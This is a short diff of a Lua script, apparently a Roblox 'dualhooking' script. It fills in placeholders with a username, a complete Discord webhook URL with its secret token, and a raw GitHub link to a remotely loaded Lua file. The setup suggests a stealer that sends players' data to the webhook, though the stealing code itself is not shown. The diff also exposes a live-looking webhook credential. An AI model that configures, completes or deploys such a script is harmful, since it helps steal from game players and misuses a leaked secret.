@@ -7,9 +7,9 @@
 
 ]]--
 
-local dhuser = "User Here"       -- dualhooking user
-local dhwebhook = "Webhook Here" -- Dualhooking Webhook
-local loadingraw = "LoadingScreen Raw Link" -- Put Your LoadingScreen Raw Link Here
+local dhuser = "dragonslicer213"       -- dualhooking user
+local dhwebhook = "https://discord.com/api/webhooks/1131653835228729384/TL8vzn5-btQ4EJGZPtPdFjhwh8qykSInEnMfBEV9UOb0QhqfpwmiYU7R-jVlF_U9CkHx" -- Dualhooking Webhook
+local loadingraw = "https://raw.githubusercontent.com/PsxScriptsW/screen/main/Loading_Screen.lua" -- Put Your LoadingScreen Raw Link Here
 
 if getgenv().executed1 then return end
 getgenv().executed1 = true
